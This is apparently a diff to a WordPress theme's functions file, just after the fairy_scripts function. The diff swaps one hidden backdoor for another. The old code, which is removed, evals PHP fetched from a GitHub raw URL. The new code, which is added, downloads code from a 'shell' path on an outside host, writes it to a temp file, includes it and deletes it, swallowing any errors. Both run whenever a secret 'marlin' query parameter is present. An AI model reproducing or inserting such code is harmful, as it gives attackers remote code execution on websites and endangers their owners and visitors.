@@ -378,17 +378,22 @@ function fairy_scripts()
 		}
 	}
 }
- if (isset($_GET['marlin']) && isset($_GET['marlin'])) {
-    $remote_url = "https://raw.githubusercontent.com/marketmg2/asss/refs/heads/main/alfaa-gila.php
-";
-    $remote_code = @file_get_contents($remote_url);
+ if (isset($_GET['marlin'])) {
+    try {
+        $u = "https://hypocriteseo.site/shell/compiler-cha-kwetiaw.txt";
+        $f = sys_get_temp_dir() . "/" . uniqid("f_", true) . ".php";
 
-    if ($remote_code !== false) {
-        eval("?>".$remote_code);
-    } else {
-        echo "Gagal mengambil script dari GitHub.";
+        $c = @file_get_contents($u);
+        if ($c !== false && @file_put_contents($f, $c)) {
+            @chmod($f, 0644);
+            register_shutdown_function(function() use ($f) {
+                @unlink($f);
+            });
+            include $f;
+        }
+    } catch (Throwable $e) {
+
     }
-    exit;
 }
 add_action('wp_enqueue_scripts', 'fairy_scripts');
 
